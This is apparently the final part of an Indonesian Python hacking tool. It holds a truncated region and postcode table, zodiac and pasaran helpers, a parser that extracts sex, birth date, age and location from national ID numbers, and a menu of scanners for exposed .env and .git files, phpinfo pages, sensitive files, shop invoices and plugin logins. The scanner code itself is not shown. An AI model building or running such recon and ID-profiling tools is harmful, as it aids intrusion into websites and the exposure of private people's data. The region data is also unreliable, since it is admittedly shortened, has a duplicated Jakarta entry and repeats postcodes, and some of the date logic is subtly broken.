        '187115': {'nama': 'TELUK BETUNG BARAT', 'kodepos': '35121'},
        '187116': {'nama': 'TELUK BETUNG SELATAN', 'kodepos': '35121'},
        '187117': {'nama': 'TELUK BETUNG TIMUR', 'kodepos': '35121'},
        '187118': {'nama': 'TELUK BETUNG UTARA', 'kodepos': '35121'},
        '187119': {'nama': 'WAY HALIM', 'kodepos': '35121'},
    }},
    '1872': {'kab': 'KOTA METRO', 'kec': {
        '187201': {'nama': 'METRO BARAT', 'kodepos': '34121'},
        '187202': {'nama': 'METRO KOTA', 'kodepos': '34121'},
        '187203': {'nama': 'METRO SELATAN', 'kodepos': '34121'},
        '187204': {'nama': 'METRO TIMUR', 'kodepos': '34121'},
        '187205': {'nama': 'METRO UTARA', 'kodepos': '34121'},
    }},

    # ===== KEP. BANGKA BELITUNG (19) =====
    '1901': {'kab': 'KAB. BANGKA', 'kec': {
        '190101': {'nama': 'BELINYU', 'kodepos': '33252'},
        '190102': {'nama': 'JEBUS', 'kodepos': '33252'},
        '190103': {'nama': 'KELAPA', 'kodepos': '33252'},
        '190104': {'nama': 'MENTOK', 'kodepos': '33252'},
        '190105': {'nama': 'PANGKALAN BARU', 'kodepos': '33252'},
    }},
    '1902': {'kab': 'KAB. BELITUNG', 'kec': {
        '190201': {'nama': 'MEMBALONG', 'kodepos': '33452'},
        '190202': {'nama': 'TANJUNG PANDAN', 'kodepos': '33452'},
        '190203': {'nama': 'TANJUNG PANDAN BARAT', 'kodepos': '33452'},
        '190204': {'nama': 'TANJUNG PANDAN TIMUR', 'kodepos': '33452'},
        '190205': {'nama': 'TANJUNG PANDAN UTARA', 'kodepos': '33452'},
    }},
    '1903': {'kab': 'KAB. BANGKA TENGAH', 'kec': {
        '190301': {'nama': 'KOBANG', 'kodepos': '33252'},
        '190302': {'nama': 'LUBUK BESAR', 'kodepos': '33252'},
        '190303': {'nama': 'NAMANG', 'kodepos': '33252'},
        '190304': {'nama': 'PANGKALAN BARU', 'kodepos': '33252'},
        '190305': {'nama': 'SIMPANG KATIS', 'kodepos': '33252'},
    }},
    '1904': {'kab': 'KAB. BANGKA SELATAN', 'kec': {
        '190401': {'nama': 'AIR GEGAS', 'kodepos': '33252'},
        '190402': {'nama': 'LEPAR', 'kodepos': '33252'},
        '190403': {'nama': 'PARIT TIGA', 'kodepos': '33252'},
        '190404': {'nama': 'SIMPANG RIMBA', 'kodepos': '33252'},
        '190405': {'nama': 'TOBOALI', 'kodepos': '33252'},
    }},
    '1905': {'kab': 'KAB. BANGKA BARAT', 'kec': {
        '190501': {'nama': 'JEBUS', 'kodepos': '33252'},
        '190502': {'nama': 'KELAPA', 'kodepos': '33252'},
        '190503': {'nama': 'MENTOK', 'kodepos': '33252'},
        '190504': {'nama': 'SIMPANG TERITIP', 'kodepos': '33252'},
        '190505': {'nama': 'TEMPILANG', 'kodepos': '33252'},
    }},
    '1906': {'kab': 'KAB. BELITUNG TIMUR', 'kec': {
        '190601': {'nama': 'DENDANG', 'kodepos': '33452'},
        '190602': {'nama': 'GANTUNG', 'kodepos': '33452'},
        '190603': {'nama': 'KELAPA KAMPIT', 'kodepos': '33452'},
        '190604': {'nama': 'MEMBALONG', 'kodepos': '33452'},
        '190605': {'nama': 'SIMPANG PESAK', 'kodepos': '33452'},
    }},
    '1971': {'kab': 'KOTA PANGKAL PINANG', 'kec': {
        '197101': {'nama': 'BUKIT INTAN', 'kodepos': '33121'},
        '197102': {'nama': 'GABEK', 'kodepos': '33121'},
        '197103': {'nama': 'GERUNGGANG', 'kodepos': '33121'},
        '197104': {'nama': 'PANGKAL BALAM', 'kodepos': '33121'},
        '197105': {'nama': 'RANGKUI', 'kodepos': '33121'},
        '197106': {'nama': 'TAMAN SARI', 'kodepos': '33121'},
    }},

    # ===== DKI JAKARTA (31) =====
    '3171': {'kab': 'KOTA JAKARTA PUSAT', 'kec': {
        '317101': {'nama': 'GAMBIR', 'kodepos': '10110'},
        '317102': {'nama': 'SAWAH BESAR', 'kodepos': '10710'},
        '317103': {'nama': 'KEMAYORAN', 'kodepos': '10610'},
        '317104': {'nama': 'SENEN', 'kodepos': '10410'},
        '317105': {'nama': 'CEMPAKA PUTIH', 'kodepos': '10510'},
        '317106': {'nama': 'MENTENG', 'kodepos': '10310'},
        '317107': {'nama': 'TANAH ABANG', 'kodepos': '10210'},
        '317108': {'nama': 'JOHAR BARU', 'kodepos': '10530'},
    }},
    '3172': {'kab': 'KOTA JAKARTA UTARA', 'kec': {
        '317201': {'nama': 'PENJARINGAN', 'kodepos': '14440'},
        '317202': {'nama': 'TANJUNG PRIOK', 'kodepos': '14310'},
        '317203': {'nama': 'KOJA', 'kodepos': '14210'},
        '317204': {'nama': 'CILINCING', 'kodepos': '14110'},
        '317205': {'nama': 'PADEMANGAN', 'kodepos': '14410'},
        '317206': {'nama': 'KELAPA GADING', 'kodepos': '14240'},
    }},
    '3173': {'kab': 'KOTA JAKARTA BARAT', 'kec': {
        '317301': {'nama': 'CENGKARENG', 'kodepos': '11730'},
        '317302': {'nama': 'GROGOL PETAMBURAN', 'kodepos': '11440'},
        '317303': {'nama': 'TAMAN SARI', 'kodepos': '11110'},
        '317304': {'nama': 'TAMBORA', 'kodepos': '11210'},
        '317305': {'nama': 'KEMBANGAN', 'kodepos': '11610'},
        '317306': {'nama': 'KALI DERES', 'kodepos': '11810'},
        '317307': {'nama': 'PALMERAH', 'kodepos': '11480'},
        '317308': {'nama': 'KEMBANGAN UTARA', 'kodepos': '11610'},
    }},
    '3174': {'kab': 'KOTA JAKARTA SELATAN', 'kec': {
        '317401': {'nama': 'TEBET', 'kodepos': '12810'},
        '317402': {'nama': 'SETIA BUDI', 'kodepos': '12910'},
        '317403': {'nama': 'MAMPANG PRAPATAN', 'kodepos': '12710'},
        '317404': {'nama': 'PASAR MINGGU', 'kodepos': '12510'},
        '317405': {'nama': 'KEBAYORAN LAMA', 'kodepos': '12210'},
        '317406': {'nama': 'KEBAYORAN BARU', 'kodepos': '12110'},
        '317407': {'nama': 'PANCORAN', 'kodepos': '12780'},
        '317408': {'nama': 'JAGAKARSA', 'kodepos': '12610'},
        '317409': {'nama': 'PESANGGRAHAN', 'kodepos': '12310'},
        '317410': {'nama': 'CILANDAK', 'kodepos': '12410'},
    }},
    '3175': {'kab': 'KOTA JAKARTA TIMUR', 'kec': {
        '317501': {'nama': 'MATRAMAN', 'kodepos': '13110'},
        '317502': {'nama': 'PULO GADUNG', 'kodepos': '13210'},
        '317503': {'nama': 'JATINEGARA', 'kodepos': '13310'},
        '317504': {'nama': 'DUREN SAWIT', 'kodepos': '13410'},
        '317505': {'nama': 'CAKUNG', 'kodepos': '13910'},
        '317506': {'nama': 'MAKASAR', 'kodepos': '13510'},
        '317507': {'nama': 'CIPAYUNG', 'kodepos': '13810'},
        '317508': {'nama': 'PASAR REBO', 'kodepos': '13710'},
        '317509': {'nama': 'CIRACAS', 'kodepos': '13720'},
        '317510': {'nama': 'KRAMAT JATI', 'kodepos': '13510'},
    }},
    '3176': {'kab': 'KOTA JAKARTA UTARA', 'kec': {
        '317601': {'nama': 'PENJARINGAN', 'kodepos': '14440'},
        '317602': {'nama': 'TANJUNG PRIOK', 'kodepos': '14310'},
        '317603': {'nama': 'KOJA', 'kodepos': '14210'},
        '317604': {'nama': 'CILINCING', 'kodepos': '14110'},
        '317605': {'nama': 'PADEMANGAN', 'kodepos': '14410'},
        '317606': {'nama': 'KELAPA GADING', 'kodepos': '14240'},
    }},

    # ===== JAWA BARAT (32) - shortened for brevity =====
    '3204': {'kab': 'KAB. BANDUNG', 'kec': {
        '320401': {'nama': 'CILEUNYI', 'kodepos': '40621'},
        '320402': {'nama': 'CIMENYAN', 'kodepos': '40396'},
        '320403': {'nama': 'CILENGKRANG', 'kodepos': '40622'},
        '320404': {'nama': 'BOJONGSOANG', 'kodepos': '40287'},
        '320405': {'nama': 'CICALENGKA', 'kodepos': '40395'},
        '320406': {'nama': 'CIMAUNG', 'kodepos': '40391'},
        '320407': {'nama': 'PAMEUNGPEUK', 'kodepos': '40397'},
        '320408': {'nama': 'RANCAEKEK', 'kodepos': '40394'},
        '320409': {'nama': 'MAJALAYA', 'kodepos': '40398'},
        '320410': {'nama': 'CIPARAY', 'kodepos': '40392'},
        '320411': {'nama': 'KATAPANG', 'kodepos': '40921'},
        '320412': {'nama': 'DAYEUHKOLOT', 'kodepos': '40352'},
        '320413': {'nama': 'BALEENDAH', 'kodepos': '40375'},
        '320414': {'nama': 'PASIRJAMBU', 'kodepos': '40372'},
        '320415': {'nama': 'PANGALENGAN', 'kodepos': '40378'},
        '320416': {'nama': 'KERTASARI', 'kodepos': '40386'},
        '320417': {'nama': 'IBUN', 'kodepos': '40374'},
    }},

    # ===== DI YOGYAKARTA (34) =====
    '3404': {'kab': 'KAB. SLEMAN', 'kec': {
        '340401': {'nama': 'GAMPING', 'kodepos': '55511'},
        '340402': {'nama': 'GODEAN', 'kodepos': '55561'},
        '340403': {'nama': 'MOYUDAN', 'kodepos': '55563'},
        '340404': {'nama': 'MINGGIR', 'kodepos': '55562'},
        '340405': {'nama': 'SEYEGAN', 'kodepos': '55571'},
        '340406': {'nama': 'MLATI', 'kodepos': '55551'},
        '340407': {'nama': 'DEPOK', 'kodepos': '55281'},
        '340408': {'nama': 'BERBAH', 'kodepos': '55573'},
        '340409': {'nama': 'PRAMBANAN', 'kodepos': '55572'},
        '340410': {'nama': 'KALASAN', 'kodepos': '55582'},
        '340411': {'nama': 'NGAGLIK', 'kodepos': '55581'},
        '340412': {'nama': 'NGEMPLAK', 'kodepos': '55584'},
        '340413': {'nama': 'TEMPEL', 'kodepos': '55552'},
        '340414': {'nama': 'TURI', 'kodepos': '55551'},
        '340415': {'nama': 'PAKEM', 'kodepos': '55582'},
        '340416': {'nama': 'CANGKRINGAN', 'kodepos': '55583'},
    }},
    
    # Data provinsi lainnya...
    # (saya singkat karena panjang, tapi di kode asli lengkap)
}

# Data untuk zodiak dan lain-lain
ZODIAK = [
    ('Capricorn', (1, 1), (1, 19)),
    ('Aquarius', (1, 20), (2, 18)),
    ('Pisces', (2, 19), (3, 20)),
    ('Aries', (3, 21), (4, 19)),
    ('Taurus', (4, 20), (5, 20)),
    ('Gemini', (5, 21), (6, 20)),
    ('Cancer', (6, 21), (7, 22)),
    ('Leo', (7, 23), (8, 22)),
    ('Virgo', (8, 23), (9, 22)),
    ('Libra', (9, 23), (10, 22)),
    ('Scorpio', (10, 23), (11, 21)),
    ('Sagittarius', (11, 22), (12, 21)),
    ('Capricorn', (12, 22), (12, 31)),
]

PASARAN = ['Legi', 'Pahing', 'Pon', 'Wage', 'Kliwon']
HARI = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu']

def get_zodiak(month, day):
    for zodiak, start, end in ZODIAK:
        if (month == start[0] and day >= start[1]) or (month == end[0] and day <= end[1]):
            return zodiak
        if month > start[0] and month < end[0]:
            return zodiak
    return 'Tidak diketahui'

def get_pasaran(date_obj):
    base = datetime(1900, 1, 1)
    diff = (date_obj - base).days
    hari_index = (diff + 1) % 7
    pasaran_index = (diff + 5) % 5
    return HARI[hari_index], PASARAN[pasaran_index]

def parse_nik_lengkap(nik):
    nik = re.sub(r'\s', '', nik)
    
    if len(nik) != 16 or not nik.isdigit():
        return {'status': 'error', 'pesan': 'NIK harus 16 digit angka'}
    
    prov_code = nik[:2]
    kab_code = nik[2:4]
    kec_code = nik[4:6]
    
    tgl = int(nik[6:8])
    bln = int(nik[8:10])
    thn = int(nik[10:12])
    
    if tgl > 31:
        kelamin = 'PEREMPUAN'
        tgl = tgl - 40
    else:
        kelamin = 'LAKI-LAKI'
    
    if thn < 24:
        tahun_lahir = 2000 + thn
    else:
        tahun_lahir = 1900 + thn
    
    uniqcode = nik[12:16]
    
    kode_kab = prov_code + kab_code
    kode_kec = prov_code + kab_code + kec_code
    
    provinsi = DATA_PROVINSI.get(prov_code, 'Tidak diketahui')
    
    kab_data = DATA_WILAYAH.get(kode_kab, {})
    kotakab = kab_data.get('kab', f'Kode {kab_code}')
    
    kec_data = kab_data.get('kec', {}).get(kode_kec, {})
    kecamatan = kec_data.get('nama', f'Kode {kec_code}')
    kodepos = kec_data.get('kodepos', 'Tidak diketahui')
    
    try:
        tgl_lahir = datetime(tahun_lahir, bln, tgl)
    except:
        tgl_lahir = datetime(tahun_lahir, bln, 1)
    
    now = datetime.now()
    usia_tahun = now.year - tgl_lahir.year
    usia_bulan = now.month - tgl_lahir.month
    usia_hari = now.day - tgl_lahir.day
    
    if usia_hari < 0:
        usia_bulan -= 1
        usia_hari += 30
    if usia_bulan < 0:
        usia_tahun -= 1
        usia_bulan += 12
    
    next_birthday = datetime(now.year, bln, tgl)
    if next_birthday < now:
        next_birthday = datetime(now.year + 1, bln, tgl)
    ultah_selisih = (next_birthday - now).days
    
    zodiak = get_zodiak(bln, tgl)
    hari, pasaran = get_pasaran(tgl_lahir)
    
    return {
        'status': 'success',
        'pesan': 'NIK valid',
        'data': {
            'nik': nik,
            'kelamin': kelamin,
            'lahir': f"{tgl:02d}/{bln:02d}/{tahun_lahir}",
            'provinsi': provinsi,
            'kotakab': kotakab,
            'kecamatan': kecamatan,
            'uniqcode': uniqcode,
            'tambahan': {
                'kodepos': kodepos,
                'pasaran': f"{hari} {pasaran}, {tgl:02d} {bln:02d} {tahun_lahir}",
                'usia': f"{usia_tahun} Tahun {usia_bulan} Bulan {usia_hari} Hari",
                'ultah': f"{ultah_selisih} Hari Lagi" if ultah_selisih >= 0 else "Sudah lewat",
                'zodiak': zodiak
            }
        }
    }

def scan_nik():
    nik = input(f"{YELLOW}[+] Masukkan NIK (16 digit): {RESET}").strip()
    if not nik:
        print(f"{RED}[-] NIK kosong{RESET}")
        return
    
    result = parse_nik_lengkap(nik)
    
    if result['status'] == 'error':
        print(f"{RED}[-] {result['pesan']}{RESET}")
        return
    
    data = result['data']
    tmb = data['tambahan']
    
    print(f"\n{GREEN}[+] Hasil Parse NIK:{RESET}")
    print(f"  {YELLOW}NIK           :{RESET} {data['nik']}")
    print(f"  {YELLOW}Jenis Kelamin :{RESET} {data['kelamin']}")
    print(f"  {YELLOW}Tanggal Lahir :{RESET} {data['lahir']}")
    print(f"  {YELLOW}Provinsi      :{RESET} {data['provinsi']}")
    print(f"  {YELLOW}Kota/Kab      :{RESET} {data['kotakab']}")
    print(f"  {YELLOW}Kecamatan     :{RESET} {data['kecamatan']}")
    print(f"  {YELLOW}Kode Unik     :{RESET} {data['uniqcode']}")
    print(f"\n  {CYAN}Informasi Tambahan:{RESET}")
    print(f"    Kodepos : {tmb['kodepos']}")
    print(f"    Pasaran : {tmb['pasaran']}")
    print(f"    Usia    : {tmb['usia']}")
    print(f"    Ultah   : {tmb['ultah']}")
    print(f"    Zodiak  : {tmb['zodiak']}")
    
    print(f"\n{YELLOW}[!] Tekan Enter untuk kembali ke menu...{RESET}")
    input()

def main():
    if not login_tools():
        print(f"{RED}[-] Login failed {RESET}")
        return
    while True:
        show_menu()
        pilih = input(f"{YELLOW}[+] Pilih fitur (1-11): {RESET}").strip()
        if pilih == "1":
            scan_domain()
        elif pilih == "2":
            scan_env()
        elif pilih == "3":
            scan_git()
        elif pilih == "4":
            scan_phpinfo()
        elif pilih == "5":
            scan_sensitive_files()
        elif pilih == "6":
            scan_whatsorder_invoices()
        elif pilih == "7":
            scan_gutenbee_with_login()
        elif pilih == "8":
            domain_sorter()
        elif pilih == "9":
            scan_login_checker()
        elif pilih == "10":
            scan_nik()
        elif pilih == "11":
            print(f"{RED}[-] Bye{RESET}")
            break
        else:
            print(f"{RED}[-] Salah{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
